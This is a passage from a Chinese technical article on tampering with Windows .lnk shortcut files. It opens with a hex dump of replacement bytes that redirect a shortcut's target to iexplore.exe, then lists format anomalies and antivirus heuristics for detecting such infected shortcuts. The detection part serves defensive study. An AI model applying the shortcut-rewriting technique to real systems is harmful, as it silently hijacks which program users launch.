000000E0   00 04 00 EF BE 57 3B AD  42 3B 3C 94 69 14 00 00   ...锞 W;;<...
000000F0   00 49 00 6E 00 74 00 65  00 72 00 6E 00 65 00 74   .I.n.t.e.r.n.e.t
00000100   00 20 00 45 00 78 00 70  00 6C 00 6F 00 72 00 65   . .E.x.p.l.o.r.e
00000110   00 72 00 00 00 18 00 4C  00 32 00 00 6C 01 00 1C   .r.....L.2..l...
00000120   3B D0 50 20 00 69 65 78  70 6C 6F 72 65 2E 65 78   ; .iexplore.ex
00000130   65 00 00 30 00 03 00 04  00 EF BE 57 3B AE 42 3B   e..0.....锞 W;;
00000140   3C 0E 55 14 00 00 00 69  00 65 00 78 00 70 00 6C   <.U....i.e.x.p.l
00000150   00 6F 00 72 00 65 00 2E  00 65 00 78 00 65 00 00   .o.r.e...e.x.e..
00000160   00 1C 00                                     ...
```

用上面数据替换原有数据，就可以发现执行的目标程序已经变成 `iexplore.exe` 了。

### [0x05].关于检测

从文件格式的异常情况来看有以下几个字段可作为检测标志

1. 文件头中偏移 `0x34` 的位置，标识`.lnk`文件执行的目标文件的大小，被感染后如果未被修正，可检测该位置的值与目标文件大小。当然如果用 `Ms` 提供 `com` 接口来修改 `lnk` 文件时，该值会自动被校验重新填写，如果是这种情况，则该检测方式无效。
2. 第二个可选节 `File locator info` 中，偏移 `0x04` 字段，若出现超出文件大小的可能，则视为异常。
3. 第二个可选节 `File locator info` 中，偏移 `0x14` 如果没有网络卷，且该值不正确，则视为异常。
4. 第二个可选节后面，本地卷信息表的第一个字段，信息表长度，如果该值不正确，则视为异常。
5. 第二个可选节后面，本地卷信息表的第三个字段，卷序列号如果不匹配，则视为异常。
6. 第二个可选节后面，本地卷信息表的第四个字段，卷偏移值如果超过该节大小，则视为异常。

从反病毒引擎方面考虑，

1. 首先要解析出`.lnk`文件的指向的目标程序路径，只需特征码匹配检测一下即可。
2. 记录`.lnk`执行的目标文件，如果出现多次指向同一目标程序的阀值，也可产生报警。
3. 如果从启发式检测的角度看，`.lnk` 指向的目标程序如果导入了 `ole32.dll` 中的 `CoCreateInstance`、`CoUninitialize`、`CoInitialize` 这几个函数 则需要注意一下，通过代码分析可以定位到 `call CoCreateInstance` 部分，
    ```
    .text:00401185 52                               push    edx         ; ppv
    .text:00401186 68 20 21 40 00                   push    offset riid   ; riid   \*->这个值要注意
    .text:0040118B 6A 01                            push    1
    .text:0040118D 56                               push    esi
    .text:0040118E 68 10 21 40 00                   push    offset rclsid ; rclsid \*->这个值要注意
    .text:00401193 FF 15 FC 20 40 00                call    ds:CoCreateInstance
    ```
    如果这两个值为 `0x214ee` 和 `0x21401`，则可给予报警。当然这仅是从程序能否出现该情况的角度上来讲。
4. 如果 `Shell Item Id List` 节中的目标文件名与 `File location info` 节中的出现的目标文件名称不一致也产生报警。

### [0x06].其它

因为`.lnk`文件格式并不公开，里面还有些并不能完全确定的字段，例如，执行的目标文件路径所在的盘符，并不依赖于 `Shell Item Id List` 中指定的盘符，而是另有其他所指，所以是否还存在其它的感染方式还需要进一步研究。

**附参考文献:**

* `[1] Jesse Hager.《The Windows Shortcut File Format》`
* `[2] Cuick. 《Windows 快捷方式文件格式解析》`
* `[3]《msdn》`
